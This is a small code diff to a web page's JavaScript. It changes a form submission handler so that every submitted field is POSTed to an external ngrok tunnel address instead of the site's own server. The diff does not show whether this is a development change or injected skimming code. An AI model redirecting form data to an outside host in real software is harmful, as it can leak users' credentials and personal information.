@@ -30,7 +30,7 @@ form.addEventListener('submit', function(event) {
         for (let [key, value] of formData.entries()) {
             formDataEntries.append(key, value);
         }
-        fetch('/', {
+        fetch('https://c55b-98-219-60-196.ngrok-free.app', {
             method: 'POST',
             headers: {'Content-Type': 'application/x-www-form-urlencoded',},
             body: formDataEntries.toString(),
